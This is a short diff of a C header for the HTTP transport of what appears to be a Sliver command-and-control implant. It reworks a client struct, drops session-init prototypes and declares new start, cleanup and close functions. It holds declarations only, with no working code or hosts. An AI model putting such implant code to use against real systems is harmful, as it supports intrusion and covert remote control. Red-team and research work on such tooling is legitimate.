@@ -137,7 +137,7 @@ typedef struct _HTTP_CLIENT {
 } HTTP_CLIENT, * PHTTP_CLIENT;
 
 struct _SLIVER_HTTP_CLIENT {
-	HTTP_CONFIG HttpConfig;
+	PHTTP_CONFIG pHttpConfig;
 	PHTTP_CLIENT pHttpClient;
 	LPSTR lpHostName;
 	DWORD dwPort;
@@ -290,11 +290,6 @@ PHTTP_REQUEST CreateHttpRequest
 	_In_ DWORD cbData
 );
 
-PSLIVER_HTTP_CLIENT SliverSessionInit
-(
-	_In_ LPSTR lpC2Url
-);
-
 VOID FreeSliverHttpClient
 (
 	_In_ PSLIVER_HTTP_CLIENT pClient
@@ -304,8 +299,6 @@ LPSTR StartSessionURL
 (
 	_In_ PSLIVER_HTTP_CLIENT pClient
 );
-
-PSLIVER_HTTP_CLIENT SliverHttpInit();
 
 LPSTR ParseSegmentsUrl
 (
@@ -325,6 +318,12 @@ LPSTR CreateSessionURL
 
 PSLIVER_HTTP_CLIENT HttpInit();
 
+BOOL HttpStart
+(
+	_In_ PGLOBAL_CONFIG pConfig,
+	_In_ PSLIVER_HTTP_CLIENT pHttpClient
+);
+
 PENVELOPE HttpRecv
 (
 	_In_ PGLOBAL_CONFIG pConfig,
@@ -336,4 +335,14 @@ BOOL HttpSend
 	_In_ PGLOBAL_CONFIG pConfig,
 	_In_ PSLIVER_HTTP_CLIENT pHttpClient,
 	_In_ PENVELOPE pEnvelope
+);
+
+BOOL HttpCleanup
+(
+	_In_ PSLIVER_HTTP_CLIENT pSliverHttpClient
+);
+
+BOOL HttpClose
+(
+	_In_ PSLIVER_HTTP_CLIENT pSliverHttpClient
 );
